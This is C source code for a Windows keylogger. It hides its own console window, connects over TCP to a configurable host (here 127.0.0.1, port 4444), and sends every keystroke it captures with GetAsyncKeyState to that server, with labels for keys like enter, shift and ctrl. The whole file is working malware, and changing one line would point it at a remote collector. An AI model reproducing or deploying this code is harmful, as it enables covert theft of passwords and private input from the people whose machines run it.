#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#define HOST "127.0.0.1"


WSADATA wsa;
SOCKET connection;
SOCKADDR_IN          ServerAddr, ThisSenderInfo;
unsigned int port = 4444;

int sendKey(char* msg) {
	
	send(connection,msg,strlen(msg),0);
}

int isKeyListed(int vKey) {
	switch (vKey) {
	case VK_RETURN:
		sendKey(" *enter* ");
		break;
	case VK_BACK:
		sendKey("\b");
		break;
	case VK_SPACE:
		sendKey(" ");
		break;
	case VK_SHIFT:
		sendKey(" *shift* ");
		break;
	case VK_OEM_PERIOD:
		sendKey(" period "); 
		break;
	case VK_CONTROL:
		sendKey(" ctrl ");
		break;
	case VK_F8:
		//FileSubmit();
		exit(0);
	default: return 0;
	}
	return 1;
}

int main () {
	
	
	
	
	//Hide Console Window
	
	HWND window;
    AllocConsole();
    window=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(window,0);
    
    
    
    
    
    
    
    printf("\nInitialising Winsock...");
    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
    {
        printf("Failed. Error Code : %d",WSAGetLastError());
        return 1;
    }
    
    printf("Initialised.\n");
    
    connection = socket(AF_INET,SOCK_STREAM,0);
	
	if (connection == INVALID_SOCKET) {
		printf("Could not create socket : %d" , WSAGetLastError());
	} 
	
	printf("Socket created.\n");
	printf("HOST: |%s|",HOST);

	
	// IPv4

     ServerAddr.sin_family = AF_INET;

     // Port no.

     ServerAddr.sin_port = htons(port);

     // The IP address

     ServerAddr.sin_addr.s_addr = inet_addr(HOST);
     
     int code = connect(connection, (SOCKADDR * )&ServerAddr,sizeof(ServerAddr));
     if(code != 0)

     {

          printf("Client: connect() failed! Error code: %ld\n", WSAGetLastError());

          // Close the socket

          closesocket(connection);

          // Do the clean up

          WSACleanup();

          // Exit with error

          return -1;

     }
     
     printf("CONNECTED TO SERVER");
     
     //CONNECTED SUCCESSFULLY 
     char Key;
     while(1) {
     	for (Key = 8; Key <= 255; Key++) {
			if (GetAsyncKeyState(Key) == -32767) {
				if (isKeyListed(Key) == 0) {
					char* pChar = malloc(2*sizeof(char));
					pChar[0] = Key;
					pChar[1] = '\0';
					sendKey(pChar);
				}
			}
		}
	 }


	

    
    getchar();
    
    closesocket(connection);
    WSACleanup();
      
    return 0;
    
	
	
    
} 


